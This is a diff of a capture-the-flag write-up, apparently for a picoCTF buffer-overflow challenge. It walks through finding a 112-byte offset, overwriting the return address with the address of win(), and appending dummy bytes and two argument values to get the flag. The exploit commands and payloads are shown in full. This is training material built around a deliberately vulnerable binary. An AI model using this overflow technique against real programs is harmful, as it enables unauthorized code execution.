@@ -21,6 +21,7 @@ b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaata
 ```
 
 <img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/ab68d565-c115-40ee-8ce4-99b3ff61a1e3" />
+
 * EIP = return address and we can see that's being overrun @ address = 0x62616164
 
 ```
@@ -28,12 +29,16 @@ b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaata
 >>> print(cyclic_find(0x62616164))
 112 
 ```
+
 * 112 = our offset
+
 ```
 pwndbg> print &win
 $1 = (<text variable, no debug info> *) 0x8049296 <win> 
 ```
+
 * Knowing the address of win = 0x8049296
+
 ```
 python3
 >>> 'A'*112
@@ -48,11 +53,17 @@ b'\x96\x92\x04\x08'
 ```
 pwngdb> r <<< $echo("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\x04\x08")
 ```
+
 <img width="1863" height="753" alt="image" src="https://github.com/user-attachments/assets/8457c79f-e596-4ca2-a64f-23dd69d89f4b" />
+
 * So the command above worked since we are in the win() function now
+
 * Now all we gotta do is pad 4 bytes and add the two arguments
+
 <img width="362" height="185" alt="image" src="https://github.com/user-attachments/assets/2dfec480-3012-45c5-87f1-c19af6956796" />
+
 * We NEED these arguments or else the function won't continue
+
 * The 4 bytes are dummy bytes, those 4 bytes are the saved return address; however, we don't want to return, instead we want to continue forward
 
 ```
@@ -66,10 +77,12 @@ pwngdb> r <<< $echo("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 ```
 
 * 4 bytes = QQQQ
+
 ```
 >>> p32(0xCAFEF00D)
 b'\r\xf0\xfe\xca'
 ```
+
 ```
 >>> p32(0xF00DF00D)
 b'\r\xf0\r\xf0'
@@ -82,5 +95,6 @@ Please enter your string:
 �'�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�QQQQ
 picoCTF{argum3nt5_4_d4yZ_59cd5643}       
 ```
+
 * WOOHOOOOOOOOOOO WE FOUND THE FLAG!!!!
   
